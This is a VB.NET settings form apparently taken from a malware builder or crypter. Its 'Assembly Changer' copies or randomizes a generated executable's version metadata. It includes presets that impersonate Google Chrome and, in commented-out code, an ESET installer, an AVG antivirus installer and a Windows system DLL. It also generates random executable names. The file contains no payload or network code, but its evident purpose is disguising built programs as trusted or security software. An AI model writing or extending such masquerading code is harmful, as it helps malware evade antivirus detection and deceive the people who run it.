Public Class frmSettings
#Region "Assembly Changer"
    Dim FileTitle As String
    Dim FileDescription As String
    Dim FileCompany As String
    Dim Fileproduct As String
    Dim Filecopyright As String
    Dim Fileversion1 As Integer
    Dim Fileversion2 As Integer
    Dim Fileversion3 As Integer
    Dim Fileversion4 As Integer
    Sub ReadAssembly(ByVal Filepath As String)
        Dim f As FileVersionInfo = FileVersionInfo.GetVersionInfo(Filepath)
        FileTitle = f.InternalName
        FileDescription = f.FileDescription
        FileCompany = f.CompanyName
        Fileproduct = f.ProductName
        Filecopyright = f.LegalCopyright
        Dim version As String()
        If f.FileVersion.Contains(",") Then
            version = f.FileVersion.Split(","c)
        Else
            version = f.FileVersion.Split("."c)
        End If
        Try
            Fileversion1 = version(0)
            Fileversion2 = version(1)
            Fileversion3 = version(2)
            Fileversion4 = version(3)
        Catch ex As Exception
        End Try
    End Sub
#End Region
    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Try
            Dim Open As New OpenFileDialog
            Open.Filter = "All Files (*.*)|*.*"
            If Open.ShowDialog = vbOK Then
                ReadAssembly(Open.FileName)
                TextBox8.Text = FileTitle
                TextBox4.Text = FileDescription
                TextBox5.Text = FileCompany
                TextBox6.Text = Fileproduct
                TextBox7.Text = Filecopyright
                NumericUpDown2.Value = Fileversion1
                NumericUpDown3.Value = Fileversion2
                NumericUpDown4.Value = Fileversion3
                NumericUpDown5.Value = Fileversion4
            End If
        Catch Complexious As Exception
        End Try
    End Sub
    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        TextBox8.Text = Randomization.RandomPassword.Generate(15, 15)
        TextBox4.Text = Randomization.RandomPassword.Generate(15, 15)
        TextBox5.Text = Randomization.RandomPassword.Generate(15, 15)
        TextBox6.Text = Randomization.RandomPassword.Generate(15, 15)
        TextBox7.Text = Randomization.RandomPassword.Generate(15, 15)
        NumericUpDown2.Value = frmMain.RandomGenerator()
        NumericUpDown3.Value = frmMain.RandomGenerator()
        NumericUpDown4.Value = frmMain.RandomGenerator()
        NumericUpDown5.Value = frmMain.RandomGenerator()
    End Sub
    Private Sub frmSettings_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.WindowState = FormWindowState.Normal
        Me.MinimumSize = Me.Size
        Me.MaximumSize = Me.Size
    End Sub
    Private Sub frmSettings_FormClosing(sender As Object, A As FormClosingEventArgs) Handles MyBase.FormClosing
        If A.CloseReason <> CloseReason.FormOwnerClosing Then
            Me.Hide()
            A.Cancel = True
        End If
    End Sub
    Private Sub CheckBox10_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox10.CheckedChanged
        If CheckBox10.Checked Then
            TextBox1.Enabled = True
        Else
            TextBox1.Enabled = False
        End If
    End Sub
    Private Sub CheckBox11_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox11.CheckedChanged
        If CheckBox11.Checked Then
            TextBox2.Enabled = True
            TextBox3.Enabled = True
        Else
            TextBox2.Enabled = False
            TextBox3.Enabled = False
        End If
    End Sub
    Private Sub RadioButton8_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton8.CheckedChanged
        TextBox8.Text = "chrome_exe"
        TextBox4.Text = "Google Chrome"
        TextBox5.Text = "Google Inc."
        TextBox6.Text = "Google Chrome"
        TextBox7.Text = "Copyright 2017 Google Inc. All rights reserved."
        NumericUpDown2.Value = "67"
        NumericUpDown3.Value = "0"
        NumericUpDown4.Value = "3396"
        NumericUpDown5.Value = "87"
    End Sub

    Private Sub RadioButton9_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton9.CheckedChanged
        'TextBox8.Text = "Firefox Developer Edition"
        'TextBox4.Text = "Firefox Developer Edition"
        'TextBox5.Text = "Mozilla Corporation"
        'TextBox6.Text = "Firefox Developer Edition"
        'TextBox7.Text = "©Firefox and Mozilla Developers; available under the MPL 2 license."
        'NumericUpDown2.Value = "61"
        'NumericUpDown3.Value = "0"
        'NumericUpDown4.Value = "0"
        'NumericUpDown5.Value = "0"
    End Sub
    Private Sub RadioButton10_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton10.CheckedChanged
        'TextBox8.Text = "Bootstrapper.exe"
        'TextBox4.Text = "ESET Live Installer"
        'TextBox5.Text = "ESET"
        'TextBox6.Text = "ESET Security"
        'TextBox7.Text = "Copyright (c) ESET, spol. s r.o. 1992-2018. All rights reserved."
        'NumericUpDown2.Value = "10"
        'NumericUpDown3.Value = "2"
        'NumericUpDown4.Value = "185"
        'NumericUpDown5.Value = "0"
    End Sub
    Private Sub RadioButton11_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton11.CheckedChanged
        'TextBox8.Text = "SfxInst"
        'TextBox4.Text = "AVG Antivirus Installer"
        'TextBox5.Text = "AVG Technologies CZ, s.r.o."
        'TextBox6.Text = "AVG Internet Security System "
        'TextBox7.Text = "Copyright (C) 2018 AVG Technologies CZ, s.r.o."
        'NumericUpDown2.Value = "18"
        'NumericUpDown3.Value = "4"
        'NumericUpDown4.Value = "3895"
        'NumericUpDown5.Value = "0"
    End Sub
    Private Sub RadioButton7_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton7.CheckedChanged
        'TextBox8.Text = "aepic.dll"
        'TextBox4.Text = "Application Experience Program Cache"
        'TextBox5.Text = "Microsoft Corporation"
        'TextBox6.Text = "Microsoft® Windows® Operating System"
        'TextBox7.Text = "© Microsoft Corporation. All rights reserved."
        'NumericUpDown2.Value = "10"
        'NumericUpDown3.Value = "0"
        'NumericUpDown4.Value = "1713"
        'NumericUpDown5.Value = "0"
    End Sub
    Private Sub CheckBox12_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox12.CheckedChanged
        If CheckBox12.Checked Then
            TextBox10.Enabled = True
        Else
            TextBox10.Enabled = False
        End If
    End Sub
    Private Sub CheckBox14_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox14.CheckedChanged
        If CheckBox14.Checked Then
            TextBox11.Enabled = True
            Button1.Enabled = True
            TextBox12.Enabled = True
            TextBox13.Enabled = True
            RadioButton1.Enabled = True
            RadioButton2.Enabled = True
            ComboBox5.Enabled = True
        Else
            TextBox11.Enabled = False
            Button1.Enabled = False
            RadioButton1.Enabled = False
            RadioButton2.Enabled = False
            TextBox12.Enabled = False
            TextBox13.Enabled = False
            ComboBox5.Enabled = False
        End If
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        TextBox13.Text = Randomization.RandomPassword.Generate(10, 10) + ".exe"
        TextBox11.Text = Randomization.RandomPassword.Generate(10, 10)
        TextBox12.Text = Randomization.RandomPassword.Generate(10, 10)
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        NumericUpDown1.Value = frmMain.RandomSnype()
        NumericUpDown6.Value = frmMain.RandomNumber()
    End Sub
End Class